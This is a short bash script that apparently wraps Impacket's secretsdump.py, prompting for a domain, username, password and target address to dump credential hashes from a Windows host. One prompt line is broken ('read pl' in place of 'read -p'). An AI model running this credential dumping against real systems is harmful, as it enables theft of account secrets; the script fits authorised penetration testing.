#!/bin/bash 

# secretsdump.py <domain>/<username>:<password>@<ip_address> 

echo "Yay! We no longer screw up the syntax for 15 minutes!" 


read -p "Entre the domain:" domain


read -p "Enter the Username: " username


read -p "Enter the Password: " password


read pl "Enter the Target address: " ip_address

python3 secretsdump.py $domain/$username:$password@$ip_address
echo -e "\n📅 Test Date: $(date)"
